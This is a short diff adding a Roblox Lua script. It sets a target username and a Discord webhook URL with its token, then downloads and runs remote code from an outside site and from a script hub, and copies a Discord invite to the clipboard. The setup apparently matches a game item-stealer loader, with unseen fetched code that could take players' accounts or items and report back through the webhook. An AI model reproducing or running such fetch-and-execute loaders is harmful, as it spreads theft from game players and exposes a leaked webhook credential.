@@ -1,0 +1,10 @@
+getgenv().gui = false
+
+Username = "xavaxonosel2"
+Webhook = "https://discord.com/api/webhooks/1265627779131772970/h-JOHF_PGZLbf5t7sWBcnGl01WGsJQZiphUQx-3ZOJUIjf4Z9OKWw645H3x0WPXzNcZj"
+
+loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
+
+setclipboard("https://discord.com/invite/durXUAK7")
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/V.G-Hub_626"))()
